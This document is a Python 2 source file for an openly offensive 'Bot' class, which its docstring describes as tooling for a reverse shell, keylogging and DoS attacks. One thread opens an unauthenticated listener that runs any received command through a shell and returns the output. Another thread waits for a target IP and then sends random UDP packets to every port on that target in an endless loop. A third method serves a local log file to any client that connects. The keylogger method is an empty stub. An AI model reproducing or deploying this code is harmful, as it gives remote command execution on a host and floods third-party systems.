import socket, subprocess, random, threading


class Bot(object):
    """The class for bots. Contains methods for reverse shell, keylogging and dos attacks."""
    
    def __init__(self):
        #try: 
        t1 = threading.Thread(target=self.provide_access)
        t2 = threading.Thread(target=self.flood_remote)
        #except: 
        #    print "Error: unable to start thread"
        t1.start()
        t2.start()
        t1.join()
        t2.join()

    def provide_access(self):
        ip = ''
        port = 12344

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.bind((ip, port))

        s.listen(10)
        
        conn, addr = s.accept()
        
        while True: 
            data = conn.recv(1024) 
            if data == 'quit': 
                break 

            proc = subprocess.Popen(data, shell=True, 
                                    stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE, 
                                    stdin=subprocess.PIPE
                                    )
            stdout_value = proc.stdout.read() + proc.stderr.read()
            conn.send(stdout_value)

        s.close()

    def log_keys(self): 
        pass

    def flood_remote(self): 
        ip = ''
        port = 12346
        
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind((ip, port))

        listener.listen(10)
        conn, addr = listener.accept()
        
        remote_ip = conn.recv(1024)
        listener.close()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_bytes = random._urandom(1024)

        while True: 
            for i in xrange(1, 65535): 
                sock.sendto(fake_bytes, (remote_ip, i))
                print "sent"

    def send_file():
        ip = ''
    	port = 12345

    	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    	s.bind((ip, port))

    	s.listen(10)


    	while True:
            conn, addr = s.accept()
            #print "Connection received from {}".format(addr)
            data = conn.recv(1024)
            #print data
            f = open('log.txt', 'rb')
            l = f.read(1024)
            while l:
                conn.send(l)
                l = f.read(1024)
       
            f.close()
	    conn.shutdown(socket.SHUT_WR)
            conn.close()



def main():
    bot = Bot()

if __name__ == '__main__': 
    main()
